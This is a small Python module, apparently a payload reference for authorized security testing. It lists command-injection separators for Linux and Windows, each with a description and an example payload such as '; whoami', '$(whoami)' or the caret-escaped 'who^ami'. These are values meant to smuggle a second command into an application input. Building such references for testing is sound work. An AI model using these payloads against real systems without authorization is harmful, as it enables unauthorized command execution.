"""
Command Injection Payload Templates Database
Educational payload library for authorized security testing
"""

SEPARATORS = {
    'linux': {
        'semicolon': {
            'char': ';',
            'description': 'Sequential command execution',
            'example': '; whoami',
            'context': 'Most common separator'
        },
        'and': {
            'char': '&&',
            'description': 'Execute second command if first succeeds',
            'example': '&& whoami',
            'context': 'Conditional execution'
        },
        'or': {
            'char': '||',
            'description': 'Execute second command if first fails',
            'example': '|| whoami',
            'context': 'Error handling bypass'
        },
        'pipe': {
            'char': '|',
            'description': 'Pipe output to next command',
            'example': '| whoami',
            'context': 'Output redirection'
        },
        'newline': {
            'char': '\n',
            'description': 'Line break command separator',
            'example': '\nwhoami',
            'context': 'Multi-line injection'
        },
        'backtick': {
            'char': '`',
            'description': 'Command substitution',
            'example': '`whoami`',
            'context': 'Inline execution'
        },
        'dollar_paren': {
            'char': '$()',
            'description': 'Modern substitution',
            'example': '$(whoami)',
            'context': 'Preferred method'
        }
    },
    'windows': {
        'ampersand': {
            'char': '&',
            'description': 'Sequential execution',
            'example': '& whoami',
            'context': 'CMD separator'
        },
        'and': {
            'char': '&&',
            'description': 'Execute if previous succeeds',
            'example': '&& whoami',
            'context': 'Conditional execution'
        },
        'or': {
            'char': '||',
            'description': 'Execute if previous fails',
            'example': '|| whoami',
            'context': 'Error bypass'
        },
        'pipe': {
            'char': '|',
            'description': 'Pipe to next command',
            'example': '| whoami',
            'context': 'Output piping'
        },
        'caret': {
            'char': '^',
            'description': 'Escape character',
            'example': 'who^ami',
            'context': 'Character escaping'
        }
    }
}

def get_separators(os_type='linux'):
    return SEPARATORS.get(os_type, {})
